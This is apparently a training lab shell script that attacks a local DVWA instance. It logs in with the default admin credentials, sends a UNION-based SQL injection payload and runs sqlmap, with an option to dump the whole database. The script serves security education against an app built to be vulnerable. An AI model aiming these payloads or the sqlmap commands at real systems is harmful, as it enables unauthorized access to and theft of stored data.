#!/bin/bash
# =====================================================================
# lab_sqli.sh — SQL Injection sur DVWA (sqlmap)
# Usage: bash lab_sqli.sh [--dump]
# =====================================================================
set -uo pipefail
source "$(cd "$(dirname "${BASH_SOURCE[0]}")/../../.." && pwd)/env.sh"

DVWA="http://localhost:$DVWA_PORT"
COOKIES=$(mktemp)
CURL="curl -s --connect-timeout 5 --max-time 10"

cleanup() { rm -f "$COOKIES"; }
trap cleanup EXIT

# Login and get session
TOKEN=$($CURL -c "$COOKIES" "http://localhost:$DVWA_PORT/login.php" | grep -oP "user_token' value='\K[a-f0-9]+")
$CURL -c "$COOKIES" -b "$COOKIES" -X POST "http://localhost:$DVWA_PORT/login.php" \
  -d "username=admin&password=password&user_token=$TOKEN&Login=Login" -o /dev/null

SESSION=$(grep PHPSESSID "$COOKIES" | awk '{print $NF}')
echo "[*] Session: PHPSESSID=$SESSION"

echo ""
echo "=== SQL Injection — DVWA ==="
echo ""

echo "--- 1. Union-based (manuel) ---"
echo "Payload: ?id=1' UNION SELECT user(),database() -- -"
curl -s -b "PHPSESSID=$SESSION;security=low" "http://localhost:$DVWA_PORT/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user(),database()%20--%20-&Submit=Submit" \
  | grep -oP '<pre>.*?</pre>' | head -1

echo ""
echo "--- 2. sqlmap automatique ---"
DUMP=""
if [ "${1:-}" = "--dump" ]; then
  DUMP="--dump"
  echo "[*] Dump complet de la base dvwa"
fi

echo "[*] Lancement de sqlmap..."
sqlmap -u "http://localhost:$DVWA_PORT/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=$SESSION;security=low" \
  --batch --dbms=mysql --level=2 --no-cast \
  $DUMP 2>&1 | tail -20
